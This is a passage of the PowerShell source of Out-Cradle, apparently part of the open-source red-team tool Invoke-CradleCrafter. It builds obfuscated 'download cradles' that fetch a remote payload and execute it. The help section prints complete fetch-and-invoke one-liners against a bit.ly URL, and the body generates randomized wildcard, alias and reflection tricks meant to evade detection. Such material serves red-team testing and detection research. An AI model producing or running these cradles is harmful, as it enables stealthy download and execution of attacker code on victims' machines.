#   This file is part of Invoke-CradleCrafter.
#
#   Copyright 2017 Daniel Bohannon <@danielhbohannon>
#         while at Mandiant <http://www.mandiant.com>
#
#   Licensed under the Apache License, Version 2.0 (the "License");
#   you may not use this file except in compliance with the License.
#   You may obtain a copy of the License at
#
#       http://www.apache.org/licenses/LICENSE-2.0
#
#   Unless required by applicable law or agreed to in writing, software
#   distributed under the License is distributed on an "AS IS" BASIS,
#   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
#   See the License for the specific language governing permissions and
#   limitations under the License.



Function Out-Cradle
{
<#
.SYNOPSIS

Orchestrates exploration, selection, construction, and obfuscation of remote download cradle syntaxes that are (mostly) PowerShell-based. This function is most easily used in conjunction with Invoke-CradleCrafter.ps1.

Invoke-CradleCrafter Function: Out-Cradle
Author: Daniel Bohannon (@danielhbohannon)
License: Apache License, Version 2.0
Required Dependencies: Set-GetSetVariables, Out-EncapsulatedInvokeExpression, Out-PsGetCmdlet, Out-GetVariable, and Out-SetVariable (all located in Out-Cradle.ps1)
Optional Dependencies: None

.DESCRIPTION

Out-Cradle orchestrates exploration, selection, construction, and obfuscation of remote download cradle syntaxes that are (mostly) PowerShell-based. This function is most easily used in conjunction with Invoke-CradleCrafter.ps1.

.PARAMETER Url

Specifies the Url of the staged payload to be downloaded and invoked by the remote download cradle payload.

.PARAMETER Path

(Optional) Specifies the Path to download the remote payload to for disk-based cradles.

.PARAMETER Cradle

Specifies the remote download cradle type/family to construct (and potentially obfuscate).

1  --> PsWebString    (New-Object Net.WebClient - DownloadString)
2  --> PsWebData      (New-Object Net.WebClient - DownloadData)
3  --> PsWebOpenRead  (New-Object Net.WebClient - OpenRead)
4  --> NetWebString   ([Net.WebClient]::New - DownloadString) - PS3.0+
5  --> NetWebData     ([Net.WebClient]::New - DownloadData)   - PS3.0+
6  --> NetWebOpenRead ([Net.WebClient]::New - OpenRead)       - PS3.0+
7  --> PsWebRequest   (Invoke-WebRequest/IWR) - PS3.0+
8  --> PsRestMethod   (Invoke-RestMethod/IRM) - PS3.0+
9  --> NetWebRequest  ([Net.HttpWebRequest]::Create)
10 --> PsSendKeys     (New-Object -ComObject WScript.Shell).SendKeys
11 --> PsComWord      (COM Object With Microsoft Word)
12 --> PsComExcel     (COM Object With Microsoft Excel)
13 --> PsComIE        (COM Object With Internet Explorer)
20 --> PsWebFile      (New-Object Net.WebClient - DownloadFile)

.PARAMETER TokenArray

Specifies the tokens that have been obfuscated from previous invocations of Out-Cradle so that state can be maintained for all randomized obfuscation selections.

.PARAMETER Command

(Optional) Specifies the post-cradle command to be invoked after the staged payload (stored at $Url) has been invoked.

.PARAMETER ReturnAsArray

(Optional) Specifies the return of both the plaintext cradle result as well as the tagged version for display purposes (used only when invoked from Invoke-CradleCrafter).

.EXAMPLE

C:\PS> Out-Cradle -Url 'http://bit.ly/L3g1tCrad1e' -Cradle 1 -TokenArray (@('Invoke',3),@('Rearrange',2))

$url='http://bit.ly/L3g1tCrad1e';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='DownloadString';.(GCI Alias:\IE*)($wc.$ds.Invoke($url))

C:\PS> Out-Cradle -Url 'http://bit.ly/L3g1tCrad1e' -Cradle 3 -TokenArray (@('Rearrange',1),@('Invoke',9))

$url='http://bit.ly/L3g1tCrad1e';$wc2='Net.WebClient';$wc=(New-Object $wc2);$ds='OpenRead';$sr=New-Object IO.StreamReader($wc.$ds.Invoke($url));$res=$sr.ReadToEnd();$sr.Close();$res|.( ''.IndexOfAny.ToString()[114,7,84]-Join'')

.NOTES

Orchestrates exploration, selection, construction, and obfuscation of remote download cradle syntaxes that are (mostly) PowerShell-based. This function is most easily used in conjunction with Invoke-CradleCrafter.ps1.
This is a personal project developed by Daniel Bohannon while an employee at MANDIANT, A FireEye Company.

.LINK

http://www.danielbohannon.com
#>

    Param (
        [String]
        $Url = "http://bit.ly/L3g1tCrad1e",
        
        [String]
        $Path = 'Default_File_Path.ps1',

        [ValidateSet(1,2,3,4,5,6,7,8,9,10,11,12,13,20)]
        [Int]
        $Cradle,
        
        [ValidateNotNullOrEmpty()]
        [Object[]]
        $TokenArray,
        
        [ScriptBlock]
        $Command = $NULL,

        [Switch]
        $ReturnAsArray
    )
    
    # PsSendKeys is notoriously finicky from a speed perspective depending on the target system it is running on.
    # Therefore you can adjust the sleep number in milliseconds between the SendKeys commands by adjusting the below variable.
    # On systems that are not overtaxed then a value of 500 or less works perfectly fine. Other systems work better with a value of 1500.
    $NotepadSendKeysSleep = 500

    # Convert Command from ScriptBlock to String.
    If($PSBoundParameters['Command'])
    {
        [String]$Command = [String]$Command
    }

    # If user input $Path is sourced then we will strip the source and only add it back when necessary later in this function.
    If($Path -Match '^.[/\\]')
    {
        $Path = $Path.SubString(2)
    }

    # I spent a large majority of development time on making the interactive user experience enjoyable and engaging.
    # Namely, I focused on highlighting the subtle (or not-so-subtle) changes in the command syntax with each applied obfuscation technique.
    # To do this there are a large number of variables that are randomly set that some or many launcher types rely on.
    # In order to keep things simple, these variables are set in the next section of this script before the launcher Switch block.

    # The state of all token(s) name/value pairs updated this iteration will be returned to Invoke-CradleCrafter.
    $Script:TokensUpdatedThisIteration = @()

    # Set a wide (ever-growing) array of randomized variable syntaxes to be available to all launcher types.
    # Flag substrings.
    $FullArgument              = "-ComObject"
    $ComObjectFlagSubString    = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))
    $FullArgument              = "-Seconds"
    $SecondsFlagSubString      = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))
    $FullArgument              = "-Milliseconds"
    $MillisecondsFlagSubString = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))
    $FullArgument              = "-Property"
    $PropertyFlagSubString     = $FullArgument.SubString(0,(Get-Random -Minimum 2 -Maximum ($FullArgument.Length)))
        
    # Helper random variables that will be used directly in below variables.
    $LikeFlagRandom               = Get-Random -Input @('-like','-clike','-ilike')
    $EqualFlagRandom              = Get-Random -Input @('-eq','-ieq','-ceq')
    $FirstLastFlagRandom          = Get-Random -Input @('-F','-Fi','-Fir','-Firs','-First','-L','-La','-Las','-Last')
    $EncodingFlagRandom           = Get-Random -Input @('-En','-Enc','-Enco','-Encod','-Encodi','-Encodin','-Encoding')
    $ByteArgumentRandom           = Get-Random -Input @('Byte','3')
    $InvocationOperatorRandom     = Get-Random -Input @('.','&')
    $NewObjectWildcardRandom      = Get-Random -Input @('N*-O*','*w-*ct','N*ct','Ne*ct')
    $GetCommandRandom             = Get-Random -Input @('Get-Command','GCM','COMMAND')
    $GetContentRandom             = Get-Random -Input @('Get-Content','GC','CONTENT','CAT','TYPE')
    $WhereObjectRandom            = Get-Random -Input @('Where-Object','Where','?')
    $ForEachRandom                = Get-Random -Input @('ForEach-Object','ForEach','%')
    $GetMemberRandom              = Get-Random -Input @('Get-Member','GM','Member')
    $GetMethodsGetMembersRandom   = Get-Random -Input @('GetMethods()','GetMembers()')
    $MethodsOrMembersRandom       = Get-Random -Input @('Methods','Members')
    $SelectObjectRandom           = Get-Random -Input @('Select-Object','Select')
    $GetProcessRandom             = Get-Random -Input @('Get-Process','GPS','PS','Process')
    $StartSleepWildcardRandom     = Get-Random -Input @('S*t-*p','*t-S*p','St*ep','*t-Sl*')
    $Void                         = Get-Random -Input @('[Void]','$Null=')
    $MZRandom                     = Get-Random -Input @('M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z')
    $SleepArguments               = Get-Random -Input @("$SecondsFlagSubString 1","1","$MillisecondsFlagSubString 1000")
    $SleepMillisecondsArguments   = "$MillisecondsFlagSubString $NotepadSendKeysSleep"

    # Generate numerous ways to reference the current item variable, including Get-Variable varname, Get-ChildItem Variable:varname, Get-Item Variable:varname, etc.
    $CurrentItemVariable  = Out-GetVariable '_'
    $CurrentItemVariable2 = Out-GetVariable '_'
    
    # Generate numerous ways to invoke with $ExecutionContext as a variable, including Get-Variable varname, Get-ChildItem Variable:varname, Get-Item Variable:varname, etc.
    $ExecContextVariable  = @()
    $ExecContextVariable += '$ExecutionContext'
    $ExecContextVariable += Out-GetVariable (Get-Random -Input @('Ex*xt','E*t','*xec*t','*ecu*t','*cut*t','*cuti*t','*uti*t','E*ext','E*xt','E*Cont*','E*onte*','E*tex*'))
    # Select random option from above.
    $ExecContextVariable = Get-Random -Input $ExecContextVariable

    # Generate random syntax for various members and methods for ExecutionContext variable.
    $NewScriptBlockWildcardRandom = Get-Random -Input @('N*','*k','*ck','*lock','N*S*B*','*r*ock','N*i*ck','*r*ock','*w*i*ck','*w*o*k','*S*i*ck')
    $InvokeScriptWildcardRandom   = Get-Random -Input @('I*','In*','I*t','*S*i*t','*n*o*t','*k*i*t','*ke*pt','*v*ip*','*pt','*k*ript')
    $GetCmdletWildcardRandom      = Get-Random -Input @('G*Cm*t','G*t','*Cm*t','*md*t','*dl*t','*let','*et','*m*t')
    $GetCmdletsWildcardRandom     = Get-Random -Input @('*ts','Ge*ts','G*ts','*Cm*ts','*md*ts','*dl*ts','*lets','*ets','*m*ts')
    $GetCommandWildcardRandom     = Get-Random -Input @('G*d','*and','*nd','*d','G*o*d','*Co*d','*t*om*d','*mma*d','*ma*d','G*a*d','*t*a*d')
    $GetCommandNameWildcardRandom = Get-Random -Input @('G*om*e','*nd*e','*Com*e','*om*e','*dName','*Co*me','*Com*e','*man*Name')
    $InvokeCommand                = Get-Random -Input @('InvokeCommand' ,"(($ExecContextVariable|$GetMemberRandom)[6].Name)")
    $NewScriptBlock               = Get-Random -Input @('NewScriptBlock',"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$NewScriptBlockWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$NewScriptBlockWildcardRandom'}).Name).Invoke")
    $InvokeScript                 = Get-Random -Input @('InvokeScript'  ,"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$InvokeScriptWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$InvokeScriptWildcardRandom'}).Name).Invoke")
    $GetCmdlet                    = Get-Random -Input @('GetCmdlet'     ,"(($ExecContextVariable.$InvokeCommand|$GetMemberRandom)[2].Name).Invoke","(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCmdletWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCmdletWildcardRandom'}).Name).Invoke")
    $GetCmdlets                   = Get-Random -Input @('GetCmdlets'    ,"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCmdletsWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCmdletsWildcardRandom'}).Name).Invoke")
    $GetCommand                   = Get-Random -Input @('GetCommand'    ,"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCommandWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCommandWildcardRandom'}).Name).Invoke")
    $GetCommandName               = Get-Random -Input @('GetCommandName',"(($ExecContextVariable.$InvokeCommand.PsObject.Methods|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCommandNameWildcardRandom'}).Name).Invoke","(($ExecContextVariable.$InvokeCommand|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$GetCommandNameWildcardRandom'}).Name).Invoke")

    # Create random variable names with random case for certain remote download syntax options.
    # If a launcher is added that requires more random variables than is defined in below $NumberOfRandomVars variable then increase this variable below.
    $VarNameCharacters = @('a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z','0','1','2','3','4','5','6','7','8','9')
    $NumberOfRandomVars = 8
    $RandomVarArray = @()
    # This $ExistingVariables logic is only included to prevent variable collisions when mass testing is performed in a single PowerShell session.
    # However, some collisions may still occur given the nature of wildcard syntaxes used in certain obfuscation techniques.
    $ExistingVariables = (Get-Variable).Name
    For($i=1; $i -lt $NumberOfRandomVars+1; $i++)
    {
        $RandomVarName = (Get-Random -Input $VarNameCharacters -Count (Get-Random -Input @(1..3)) | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''

        While(($RandomVarArray + $ExistingVariables) -Contains $RandomVarName)
        {
            # To ensure different random variable names, keep choosing random values for $RandomVarName until it does not match any variable names in $RandomVarArray.
            $RandomVarName = (Get-Random -Input $VarNameCharacters -Count (Get-Random -Input @(1..5)) | ForEach-Object {$Char = $_; If(Get-Random -Input (0..1)){$Char = $Char.ToString().ToUpper()} $Char}) -Join ''
        }

        $RandomVarArray += $RandomVarName
        Set-Variable ('RandomVarName' + $i) $RandomVarName
    }

    # To create a more consistent experience, many launcher command component are compromised of other components that can be selectively obfuscated in Invoke-CradleCrafter.
    # In order to enable these sub-components to be changed across the board, many TAGS are set below.
    # These TAGS are used in the syntax during variable initialization and replaced in the launcher Switch block.
    $VarTag1                  = '<VAR1TAG>'
    $VarTag2                  = '<VAR2TAG>'
    $JoinTag                  = '<VALUETOJOINTAG>'
    $ByteTag                  = '<BYTEARRAYTAG>'
    $InvokeTag                = '<INVOKETAG>'
    $CommandTag               = '<COMMANDTAG>'
    $CommandEscapedStringTag  = "<COMMANDESCAPEDSTRINGTAG>"
    $NewObjectTag             = "<NEWOBJECTTAG>"
    $NewObjectNetWebClientTag = "<NEWOBJECTNETWEBCLIENTTAG>"
    $NetHttpWebRequestTag     = "<NETHTTPWEBREQUESTTAG>"
    $SRSetVarTag              = "<STREAMREADERSETVARIABLETAG>"
    $SRGetVarTag              = "<STREAMREADERGETVARIABLETAG>"
    $WRSetVarTag              = "<WEBREQUESTSETVARIABLETAG>"
    $WRGetVarTag              = "<WEBREQUESTGETVARIABLETAG>"
    $ResultSetVarTag          = "<RESULTSETVARIABLETAG>"
    $ResultGetVarTag          = "<RESULTGETVARIABLETAG>"
    $GPGetVarTag              = "<GETITEMPROPERTYSETVARIABLETAG>"
    $iWindowPosYTag           = "<IWINDOWSPOSYTAG>"
    $ResponseTag              = "<WEBREQUESTRESPONSETAG>"
    $OpenReadTag              = "<OPENREADTAG>"
    $UrlTag                   = "<URLTAG>"
    $DocumentTag              = '<DOCUMENTPROPERTYTAG>'
    $DocumentsTag             = '<DOCUMENTSPROPERTYTAG>'
    $BodyTag                  = '<BODYPROPERTYTAG>'
    $ContentTag               = '<CONTENTTAG>'
    $GetItemPropertyTag       = '<GETITEMPROPERTYTAG>'
    $ModuleAutoLoadTag        = '<MODULEAUTOLOADTAG>'
    $ReflectionAssemblyTag    = '<REFLECTIONASSEMBLYTAG>'
    $WScriptShellTag          = '<WSCRIPTSHELLTAG>'
    $WindowsFormsClipboardTag = '<WINDOWSFORMSCLIPBOARDTAG>'
    $ReadToEndTag             = '<CONTENTTOREADTOENDTAG>'
    $ComMemberTag             = '<COMMEMBERTAG>'
    $NewLineTag               = '<NEWLINETAG>'
    $JoinNewLineTag           = '<VALUETOJOINTAG>'
    $SheetsTag                = '<SHEETSTAG>'
    $ItemTag                  = '<ITEMTAG>'
    $UsedRangeTag             = '<USEDRANGETAG>'
    $RowsTag                  = '<ROWSTAG>'
    $PathTag                  = '<PATHTAG>'

    # Set $Invoke and $InvokeWithTags variables to $InvokeTag as default.
    # If it is currently selected to obfuscate or a set value has been passed in then this default value will be overwritten.
    $Invoke         = $InvokeTag
    $InvokeWithTags = $InvokeTag

    # Wildcard values for various methods used in below $OptionsVarArr.
    $DownloadStringWildcardRandom      = Get-Random -Input @('D*g','*wn*g','*nl*g','*wn*d*g')
    $DownloadDataWildcardRandom        = Get-Random -Input @('D*a','*wn*a','*nl*a','*wn*d*a')
    $DownloadFileWildcardRandom        = Get-Random -Input @('Do*e','D*le','D*ile','Dow*i*le','D*ad*i*e','Do*o*d*le','Do*o*F*e','*w*i*le','*w*o*e','*w*ad*e','*n*ile','*n*o*d*e')
    $OpenReadWildcardRandom            = Get-Random -Input @('O*ad','Op*ad','*ad','*Read','*pe*ead')
    $ReadToEndWildcardRandom           = Get-Random -Input @('R*nd','R*To*d','R*a*nd','Re*To*nd','*nd','*To*nd')
    $BusyWildcardRandom                = Get-Random -Input @('B*','*sy','B*y','*usy','Bu*y')
    $DocumentWildcardRandom            = Get-Random -Input @('D*','*ment','D*t','Do*t','*cu*t','Do*nt','*o*u*e*t')
    $DocumentsWildcardRandom           = Get-Random -Input @('Do*ts','D*nts','D*cu*ts','D*men*s','D*o*men*s','Do*nts','D*ents')
    $BodyWildcardRandom                = Get-Random -Input @('bo*','b*y','bo*y','b*dy','bo*')
    $InnerTextWildcardRandom           = Get-Random -Input @('inn*t','inn*t','inn*ext','inn*t','o*Text','ou*t','o*ext','o*xt','o*rTex*')
    $InvokeWebRequestWildcardRandom    = Get-Random -Input @('I*st','In*k*t','I*-Web*','I*que*','*quest','I*e*e*e*e*t','I*v*W*R*t')
    $InvokeRestMethodWildcardRandom    = Get-Random -Input @('I*R*od','*-R*od','*-Re*d','I*vo*t*e*d','*v*est*e*d','*R*od','*k*Rest*')
    $GetItemPropertyWildcardRandom     = Get-Random -Input @('G*-I*y','G*-Ite*y','G*-I*ty','G*em*y','G*I*emP*y')
    $SetItemPropertyWildcardRandom     = Get-Random -Input @('S*-I*y','S*-Ite*y','S*-I*ty','S*em*y','S*I*emP*y')
    $LoadWithPartialNameWildcardRandom = Get-Random -Input @('L*me','*W*h*i*N*e','*W*h*i*l*e','*d*i*N*e','*d*i*me','*a*a*a*a*','L*ame','*d*art*','*th*i*N*','*Pa*i*N*','L*i*r*a*')
    $OpenWildcardRandom                = Get-Random -Input @('O*n','Op*n','O*en')
    $ItemWildcardRandom                = Get-Random -Input @('I*em','I*m','It*','Ite*','*m','*em','*tem','*t*m')

    # Random and obscure commands that will produce no output but will cause module auto-loading to occur for PS3.0+ which is required before certain 1.0 syntaxes for GetCmdlet and GetCommand will work.
    # "Import-Module/IPMO Microsoft.PowerShell.Management" would also do the trick, but the below options are much more subtle -- and fun :)
    $ModuleAutoLoadRandom = (Get-Random -Input @('cd','sl','ls pena*','ls _-*','ls sl*','ls panyo*','dir ty*','dir rid*','dir ect*','item ize*','item *z','popd','pushd','gdr -*')) + ';'

    # Random values for SendKeys cradle types.
    $SendKeysEnter         = Get-Random -Input @('~','{ENTER}')
    $WindowsFormsScreen    = Get-Random -Input @('[System.Windows.Forms.Screen]','[Windows.Forms.Screen]')
    $WindowsFormsClipboard = Get-Random -Input @('System.Windows.Forms.Clipboard','Windows.Forms.Clipboard')
    $ClearClipboard        = Get-Random -Input @('Clear()',"SetText(' ')")
    $ScreenHeight          = Get-Random -Input @("Split('=')[5].Split('}')[0]","Split('}')[0].Split('=')[5]")
    $LessThanTwoRandom     = Get-Random -Input @(' -lt 2',' -le 1')
        
    # Additional variables for below $OptionsVarArr.
    $SystemIOStreamReader     = Get-Random -Input @('System.IO.StreamReader','IO.StreamReader')
    $WhileReadByteSyntax      = @()
    $WhileReadByteSyntax     += "$ResultSetVarTag'';Try{While(1){$ResultGetVarTag+=[Char]$WRGetVarTag.ReadByte()}}Catch{}"
    $WhileReadByteSyntax     += "$ResultSetVarTag'';Try{While($ResultGetVarTag+=[Char]$WRGetVarTag.ReadByte()){}}Catch{}"
    $WhileReadByte            = Get-Random -Input $WhileReadByteSyntax
    $ReadToEndRandom          = Get-Random -Input @("$ReadToEndTag.ReadToEnd()","($ReadToEndTag|$ForEachRandom{$CurrentItemVariable.(($CurrentItemVariable2|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$ReadToEndWildcardRandom'}).Name).Invoke()})")
    $StringConversionWithTags = Get-Random -Input @("$ResponseTag.ToString()","([String]$ResponseTag)","($ResponseTag-As'String')")

    # The remaining variables are all variables that are explicitly set based on Invoke-CradleCrafter options.
    # For display purposes we will maintain a tagged and tagless version of every configurable variable (all of the below).
    # To simplify this we track these configurable variables with $OptionsVarArr and set the tagged version of the variable in the next step.
    $OptionsVarArr = @()
    $NewObjectOptions                     = @("New-Object ","$InvocationOperatorRandom($GetCommandRandom $NewObjectWildcardRandom)",($ModuleAutoLoadTag + $InvocationOperatorRandom + (Out-PsGetCmdlet $NewObjectWildcardRandom)))
    $OptionsVarArr                       +=   "NewObject"
    $NewObjectRandom                      =    Get-Random -Input @($NewObjectOptions[0],$NewObjectOptions[1])
    $InvokeWebRequestOptions              = @((Get-Random -Input @('Invoke-WebRequest','IWR')),(Get-Random -Input @('WGET','CURL')),"$InvocationOperatorRandom($GetCommandRandom $InvokeWebRequestWildcardRandom)",($InvocationOperatorRandom + (Out-PsGetCmdlet $InvokeWebRequestWildcardRandom)))
    $OptionsVarArr                       +=   "InvokeWebRequest"
    $InvokeRestMethodOptions              = @((Get-Random -Input @('Invoke-RestMethod','IRM')),"$InvocationOperatorRandom($GetCommandRandom $InvokeRestMethodWildcardRandom)",($InvocationOperatorRandom + (Out-PsGetCmdlet $InvokeRestMethodWildcardRandom)))
    $OptionsVarArr                       +=   "InvokeRestMethod"
    $GetItemPropertyOptions               = @((Get-Random -Input @('Get-ItemProperty ','GP ','ItemProperty ')),"$InvocationOperatorRandom($GetCommandRandom $GetItemPropertyWildcardRandom)",($ModuleAutoLoadTag + $InvocationOperatorRandom + (Out-PsGetCmdlet $GetItemPropertyWildcardRandom)))
    $OptionsVarArr                       +=   "GetItemProperty"
    $SetItemPropertyOptions               = @((Get-Random -Input @('Set-ItemProperty ','SP ')),"$InvocationOperatorRandom($GetCommandRandom $SetItemPropertyWildcardRandom)",($ModuleAutoLoadTag + $InvocationOperatorRandom + (Out-PsGetCmdlet $SetItemPropertyWildcardRandom)))
    $OptionsVarArr                       +=   "SetItemProperty"
    $DownloadStringOptions                = @("DownloadString","(((($NewObjectNetWebClientTag).PsObject.Methods)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadStringWildcardRandom'}).Name)","((($NewObjectNetWebClientTag|$GetMemberRandom)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadStringWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "DownloadString"
    $DownloadDataOptions                  = @("DownloadData","(((($NewObjectNetWebClientTag).PsObject.Methods)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadDataWildcardRandom'}).Name)","((($NewObjectNetWebClientTag|$GetMemberRandom)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadDataWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "DownloadData"
    $DownloadFileOptions                  = @("DownloadFile","(((($NewObjectNetWebClientTag).PsObject.Methods)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadFileWildcardRandom'}).Name)","((($NewObjectNetWebClientTag|$GetMemberRandom)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DownloadFileWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "DownloadFile"
    $OpenReadOptions                      = @("OpenRead","(((($NewObjectNetWebClientTag).PsObject.Methods)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$OpenReadWildcardRandom'}).Name)","((($NewObjectNetWebClientTag|$GetMemberRandom)|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$OpenReadWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "OpenRead"
    $StreamOptions                        = @(("$SRSetVarTag$NewObjectTag$SystemIOStreamReader($ResponseTag);$ResultSetVarTag" + $ReadToEndRandom.Replace($ReadToEndTag,$SRGetVarTag) + ";$SRGetVarTag.Close()"),$ReadToEndRandom.Replace($ReadToEndTag,"($NewObjectTag$SystemIOStreamReader($NewObjectNetWebClientTag).$OpenReadTag('$UrlTag'))"),$WhileReadByte)
    $OptionsVarArr                       +=   "Stream"
    $LoadWithPartialNameOptions           = @("LoadWithPartialName","($ReflectionAssemblyTag.$GetMethodsGetMembersRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$LoadWithPartialNameWildcardRandom'}|$ForEachRandom{$CurrentItemVariable2.Name}|$SelectObjectRandom $FirstLastFlagRandom 1).Invoke")
    $OptionsVarArr                       +=   "LoadWithPartialName"
    $ExecOptions                          = @("Exec","(($WScriptShellTag|$GetMemberRandom)[2].Name).Invoke")
    $OptionsVarArr                       +=   "Exec"
    $AppActivateOptions                   = @("AppActivate","(($WScriptShellTag|$GetMemberRandom)[0].Name).Invoke")
    $OptionsVarArr                       +=   "AppActivate"
    $SendKeysOptions                      = @("SendKeys","(($WScriptShellTag|$GetMemberRandom)[10].Name).Invoke")
    $OptionsVarArr                       +=   "SendKeys"
    $GetTextOptions                       = @("GetText()",("($WindowsFormsClipboardTag.$GetMethodsGetMembersRandom[" + (Get-Random -Input @(15,16)) + "].Name).Invoke()"))
    $OptionsVarArr                       +=   "GetText"
    $Stream2Options                       = @(("$SRSetVarTag$NewObjectRandom$SystemIOStreamReader($ResponseTag);$ResultSetVarTag" + $ReadToEndRandom.Replace($ReadToEndTag,$SRGetVarTag) + ";$SRGetVarTag.Close()"),$ReadToEndRandom.Replace($ReadToEndTag,"($NewObjectRandom$SystemIOStreamReader($NetHttpWebRequestTag::Create('$UrlTag').GetResponse().GetResponseStream()))"),$WhileReadByte)
    $OptionsVarArr                       +=   "Stream2"
    $NavigateOptions                      = @("Navigate","Navigate2",("(($VarTag1|$GetMemberRandom)[" + (Get-Random -Input @(7,8)) + "].Name).Invoke"))
    $OptionsVarArr                       +=   "Navigate"
    $VisibleOptions                       = @("Visible","(($VarTag1|$GetMemberRandom)[45].Name)")
    $OptionsVarArr                       +=   "Visible"
    $Visible2Options                      = @("Visible","(($VarTag1|$GetMemberRandom)[420].Name)")
    $OptionsVarArr                       +=   "Visible2"
    $DisplayAlertsOptions                 = @("DisplayAlerts","(($VarTag1|$GetMemberRandom)[298].Name)")
    $OptionsVarArr                       +=   "DisplayAlerts"
    $WorkbooksOptions                     = @("Workbooks","(($VarTag1|$GetMemberRandom)[464].Name)")
    $OptionsVarArr                       +=   "Workbooks"
    $OpenOptions                          = @("Open","(($VarTag1.$ComMemberTag.PsObject.Members|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$OpenWildcardRandom'}).Name).Invoke")
    $OptionsVarArr                       +=   "Open"        
    $SilentOptions                        = @("Silent","(($VarTag1|$GetMemberRandom)[37].Name)")
    $OptionsVarArr                       +=   "Silent"
    $ContentOptions                       = @("Content","(($VarTag2|$GetMemberRandom)[205].Name)")
    $OptionsVarArr                       +=   "Content"
    $iWindowPosDXOptions                  = @("iWindowPosDX","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[5].Name)")
    $OptionsVarArr                       +=   "iWindowPosDX"
    $iWindowPosDYOptions                  = @("iWindowPosDY","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[6].Name)")
    $OptionsVarArr                       +=   "iWindowPosDY"
    $iWindowPosXOptions                   = @("iWindowPosX","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[7].Name)")
    $OptionsVarArr                       +=   "iWindowPosX"
    $iWindowPosYOptions                   = @("iWindowPosY","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[8].Name)")
    $OptionsVarArr                       +=   "iWindowPosY"
    $StatusBarOptions                     = @("StatusBar","(($GetItemPropertyTag`HKCU:\Software\Microsoft\Notepad|$GetMemberRandom)[14].Name)")
    $OptionsVarArr                       +=   "StatusBar"
    $Content2Options                      = @("$ResponseTag.Content",$StringConversionWithTags,"($ResponseTag|$ForEachRandom{$CurrentItemVariable.(($CurrentItemVariable2.PsObject.Properties).Name[0])})",("($ResponseTag|$ForEachRandom{$CurrentItemVariable.(($CurrentItemVariable2|$GetMemberRandom)" + (Get-Random -Input @('[4].Name).Invoke()','[7].Name)')) + "})"))
    $OptionsVarArr                       +=   "Content2"
    $TextOptions                          = @("Text","(($VarTag2.$ContentTag|$GetMemberRandom)[172].Name)")
    $OptionsVarArr                       +=   "Text"
    $BusyOptions                          = @("Busy","(($VarTag1.PsObject.Properties|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$BusyWildcardRandom'}).Name)","(($VarTag1|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$BusyWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "Busy"
    $DocumentOptions                      = @("Document","(($VarTag1.PsObject.Properties|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DocumentWildcardRandom'}).Name)","(($VarTag1|$GetMemberRandom|$WhereObjectRandom{$CurrentItemVariable.Name$LikeFlagRandom'$DocumentWildcardRandom'}).Name)")
    $OptionsVarArr                       +=   "Document"
